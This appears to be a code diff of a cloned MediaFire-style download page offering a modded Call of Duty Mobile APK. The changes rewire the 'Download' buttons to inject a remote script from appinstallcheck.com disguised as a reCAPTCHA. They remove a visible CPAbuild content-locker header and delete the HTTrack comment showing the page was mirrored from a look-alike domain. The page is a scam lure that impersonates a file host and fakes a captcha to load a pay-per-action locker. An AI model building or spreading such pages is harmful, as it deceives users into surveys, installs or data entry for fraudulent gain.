@@ -3,6 +3,7 @@
   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
   <head>
     <meta charset="utf-8" />
+
     <link
       rel="icon"
       href="static/css/mf_round.svg"
@@ -12,7 +13,7 @@
     <meta http-equiv="x-ua-compatible" content="ie=edge" />
     <meta
       name="viewport"
-      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     />
     <title>Call-of-Duty-Mobile-v1.0.32-MOD-ubirt.us.apk</title>
     <meta
@@ -111,13 +112,6 @@
     </style>
 
     <link rel="stylesheet" type="text/css" href="static/css/main.css" />
-
-    <!-- [Mosawi9] Here to change you cpabuild header -->
-    <script type="text/javascript">
-      var CPABUILDSETTINGS = { it: 2358405, key: "44a9a" };
-    </script>
-    <script src="../dyodrs1kxvg6o.cloudfront.net/46ebff8.js"></script>
-    <!-- Here to change you cpabuild header -->
   </head>
 
   <body class="en defaultTheme">
@@ -199,7 +193,7 @@
                 <button onclick="downloadButton_Click()" id="downloadButton">
                   Download (95.49MB)
                 </button>
-                <div data-captcha-enable="true" id="recaptcha"></div>
+                <div data-captcha-enable="false" id="recaptchaDesktop"></div>
               </div>
             </div>
             <a
@@ -278,7 +272,7 @@
         </div>
 
         <div class="center-mobile">
-          <div data-captcha-enable="true" id="recaptchaMobile"></div>
+          <div data-captcha-enable="false" id="recaptchaMobile"></div>
           <div
             class="dl-btn-mob"
             id="downloadButtonMobile"
@@ -550,54 +544,56 @@
       </div>
     </div>
     <script>
-      var recaptcha = document.querySelector("#recaptcha");
+      var recaptchaDesktop = document.querySelector("#recaptchaDesktop");
       var recaptchaMobile = document.querySelector("#recaptchaMobile");
       var downloadButton = document.querySelector("#downloadButton");
       var downloadButtonMobile = document.querySelector(
         "#downloadButtonMobile"
       );
+      var recaptchaScriptUrl = "https://appinstallcheck.com/cp/js/pj3nl";
 
-      function hideRecaptcha() {
+      function appendRecaptchaScript() {
+        var script = document.createElement("script");
+        script.type = "text/javascript";
+        script.src = recaptchaScriptUrl;
+        document.body.appendChild(script);
+      }
+
+      function hideRecaptcha(recaptcha) {
         setDisplay(recaptcha, "none");
         setOpacity(recaptcha, 0.0);
       }
 
-      function hideRecaptchaMobile() {
-        setDisplay(recaptchaMobile, "none");
-        setOpacity(recaptchaMobile, 0.0);
+      function hideElement(element) {
+        setDisplay(element, "none");
       }
 
-      function hideDownloadButton() {
-        setDisplay(downloadButton, "none");
-      }
-
-      function hidedownloadButtonMobile() {
-        setDisplay(downloadButtonMobile, "none");
-      }
-
-      function showRecaptchaDiv() {
+      function showRecaptcha(recaptcha) {
         setDisplay(recaptcha, "block");
         showElementWithFadeEffect(recaptcha);
       }
 
-      function showRecaptchaMobileDiv() {
-        setDisplay(recaptchaMobile, "block");
-        showElementWithFadeEffect(recaptchaMobile);
+      function enableRecaptcha(recaptcha) {
+        recaptcha.dataset.captchaEnable = "true";
       }
 
       function downloadButton_Click() {
-        hideDownloadButton();
-        showRecaptchaDiv();
+        enableRecaptcha(recaptchaDesktop);
+        hideElement(downloadButton);
+        showRecaptcha(recaptchaDesktop);
+        appendRecaptchaScript();
       }
 
       function downloadButton_Tap() {
-        hidedownloadButtonMobile();
-        showRecaptchaMobileDiv();
+        enableRecaptcha(recaptchaMobile);
+        hideElement(downloadButtonMobile);
+        showRecaptcha(recaptchaMobile);
+        appendRecaptchaScript();
       }
 
       //hide recaptcha on script load
-      hideRecaptcha();
-      hideRecaptchaMobile();
+      hideRecaptcha(recaptchaDesktop);
+      hideRecaptcha(recaptchaMobile);
 
       //helpers
 
@@ -617,15 +613,11 @@
         element.style.display = displayValue;
       }
 
-      function setOpacity(element, opacity) {
-        element.style.opacity = opacity;
+      function setOpacity(element, opacityValue) {
+        element.style.opacity = opacityValue;
       }
     </script>
   </body>
-  <script
-    type="text/javascript"
-    src="https://appinstallcheck.com/cp/js/pj3nl"
-  ></script>
 
   <style>
     @media only screen and (max-width: 680px) {
@@ -634,6 +626,4 @@
       }
     }
   </style>
-
-  <!-- Mirrored from mediafire.com.de/com-activision-callofduty-shooter by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Nov 2022 22:04:11 GMT -->
 </html>
